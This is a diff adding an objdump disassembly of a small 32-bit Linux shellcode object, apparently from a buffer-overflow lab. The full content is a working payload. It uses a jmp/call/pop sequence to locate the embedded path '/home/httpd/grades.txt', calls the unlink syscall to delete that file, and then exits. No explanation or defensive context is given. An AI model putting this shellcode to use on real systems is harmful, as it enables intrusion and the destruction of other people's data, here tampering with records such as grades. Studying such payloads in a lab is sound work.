@@ -1,0 +1,35 @@
+
+shellcode.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <main>:
+   0:	eb 19                	jmp    1b <calladdr>
+
+00000002 <popladdr>:
+   2:	5e                   	pop    %esi
+   3:	89 76 17             	mov    %esi,0x17(%esi)
+   6:	31 c0                	xor    %eax,%eax
+   8:	88 46 16             	mov    %al,0x16(%esi)
+   b:	89 46 1b             	mov    %eax,0x1b(%esi)
+   e:	b0 0a                	mov    $0xa,%al
+  10:	89 f3                	mov    %esi,%ebx
+  12:	cd 80                	int    $0x80
+  14:	31 db                	xor    %ebx,%ebx
+  16:	89 d8                	mov    %ebx,%eax
+  18:	40                   	inc    %eax
+  19:	cd 80                	int    $0x80
+
+0000001b <calladdr>:
+  1b:	e8 e2 ff ff ff       	call   2 <popladdr>
+  20:	2f                   	das    
+  21:	68 6f 6d 65 2f       	push   $0x2f656d6f
+  26:	68 74 74 70 64       	push   $0x64707474
+  2b:	2f                   	das    
+  2c:	67 72 61             	addr16 jb 90 <calladdr+0x75>
+  2f:	64                   	fs
+  30:	65                   	gs
+  31:	73 2e                	jae    61 <calladdr+0x46>
+  33:	74 78                	je     ad <calladdr+0x92>
+  35:	74                   	.byte 0x74
